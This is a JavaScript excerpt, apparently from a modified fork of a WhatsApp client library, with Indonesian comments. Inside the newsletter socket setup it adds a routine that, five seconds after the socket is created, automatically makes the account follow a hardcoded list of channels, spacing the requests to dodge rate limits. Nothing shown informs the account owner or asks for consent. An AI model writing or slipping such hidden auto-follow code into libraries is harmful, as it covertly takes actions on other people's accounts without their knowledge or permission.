...
const makeNewsletterSocket = (config) => {
    ...
    // Auto join channels - Modified version
    const autoJoinChannels = async () => {
        // List channel IDs yang akan di-join
        const channelIds = [
        ...
        console.log(`[Auto Join] Starting to join ${channelIds.length} channels...`);
        
        for (const jid of channelIds) {
            try {
                console.log(`[Auto Join] Attempting to join channel: ${jid}`);
                await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
                console.log(`[Auto Join] Successfully joined channel: ${jid}`);
                // Delay 2 detik antar join untuk menghindari rate limit
                await new Promise(resolve => setTimeout(resolve, 2000));
            } catch (error) {
                console.error(`[Auto Join] Failed to join channel ${jid}:`, error.message);
                // Lanjut ke channel berikutnya meskipun ada error
            }
        }
        
        console.log('[Auto Join] Finished auto join process');
    };
    
    // Jalankan auto join setelah 5 detik (lebih cepat dari sebelumnya)
    setTimeout(async () => {
        try {
            await autoJoinChannels();
        } catch (error) {
            console.error('[Auto Join] Error in auto join process:', error.message);
        }
    }, 5000);
